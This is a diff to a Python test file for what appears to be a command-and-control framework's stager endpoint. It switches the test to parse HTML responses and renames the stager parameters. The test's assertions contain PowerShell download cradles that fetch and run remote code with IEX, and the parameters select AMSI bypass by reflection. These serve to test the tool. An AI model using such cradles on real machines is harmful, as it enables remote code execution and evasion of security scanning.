@@ -9,6 +9,7 @@ import re
 import requests
 
 import pytest
+import bs4
 
 # https://stackoverflow.com/a/33515264/1308830
 sys.path.append(os.path.join(os.path.dirname(__file__), 'helpers'))
@@ -26,47 +27,49 @@ def get_stager():
     param_set = {
         'default': {
             "flavor": "hub",
-            "GroupLauncher": "powershell",
-            "GroupAmsi": "reflection",
-            "GroupTransport": "http",
-            "GroupClipExec": "none",
-            "CheckboxProxy": "false",
-            "CheckboxTLS1.2": "false",
-            "RadioFingerprint": "true",
-            "RadioNoVerification": "false",
-            "RadioCertStore": "false",
+            "Launcher": "powershell",
+            "Amsi": "reflection",
+            "Transport": "http",
+            "ClipExec": "none",
+            "Proxy": "false",
+            "TLS1.2": "false",
+            "Fingerprint": "true",
+            "NoVerification": "false",
+            "CertStore": "false",
         },
         'HTTPS': {
             "flavor": "hub",
-            "GroupLauncher": "powershell",
-            "GroupAmsi": "reflection",
-            "GroupTransport": "https",
-            "GroupClipExec": "none",
-            "CheckboxProxy": "false",
-            "CheckboxTLS1.2": "false",
-            "RadioFingerprint": "true",
-            "RadioNoVerification": "false",
-            "RadioCertStore": "false",
+            "Launcher": "powershell",
+            "Amsi": "reflection",
+            "Transport": "https",
+            "ClipExec": "none",
+            "Proxy": "false",
+            "TLS1.2": "false",
+            "Fingerprint": "true",
+            "NoVerification": "false",
+            "CertStore": "false",
         },
         'BASH': {
             "flavor": "hub",
-            "GroupLauncher": "bash",
-            "GroupAmsi": "reflection",
-            "GroupTransport": "http",
-            "GroupClipExec": "none",
-            "CheckboxProxy": "false",
-            "CheckboxTLS1.2": "false",
-            "RadioFingerprint": "true",
-            "RadioNoVerification": "false",
-            "RadioCertStore": "false",
+            "Launcher": "bash",
+            "Amsi": "reflection",
+            "Transport": "http",
+            "ClipExec": "none",
+            "Proxy": "false",
+            "TLS1.2": "false",
+            "Fingerprint": "true",
+            "NoVerification": "false",
+            "CertStore": "false",
         },
     }
     i = 0
     while i < 10:
         try:
             for k, v in param_set.items():
-                result[k] = requests.get(f"http://{TEST_URI}:{PORT}/dlcradle",
-                                         params=v).text
+                response = requests.get(f"http://{TEST_URI}:{PORT}/dlcradle",
+                                        params=v).text
+                soup = bs4.BeautifulSoup(response, features='lxml')
+                result[k] = soup.find('code').getText()
             break
         except requests.exceptions.ConnectionError:
             i += 1
@@ -98,20 +101,22 @@ def full_app():
 
 
 def test_stager(full_app):
-    assert full_app['default'] == (
+    assert (
         "$K=New-Object Net.WebClient;IEX "
         + f"$K.DownloadString('http://{TEST_URI}:8080"
         + "/0?t=http&f=h&a=reflection');"
-    )
-    assert full_app['HTTPS'].startswith(
+    ) in (full_app['default'])
+    assert (
         "[System.Net.ServicePointManager]::ServerCertificateValidationCallback"
         + "={param($1,$2);$2.Thumbprint -eq '"
-    )
-    assert full_app['HTTPS'].endswith(
+    ) in (full_app['HTTPS'])
+    assert (
         "'};$K=New-Object Net.WebClient;IEX $K.DownloadString"
         + f"('https://{TEST_URI}:8443/0?t=https&f=h&a=reflection');"
-    )
+    ) in (full_app['HTTPS'])
 
+
+def test_stager_execution(full_app):
     win10cmd = TEST_COMMANDS["win10"] % full_app
     # Insert formatter for extra command
     win10cmd = win10cmd[:-2] + '%s' + win10cmd[-2:]
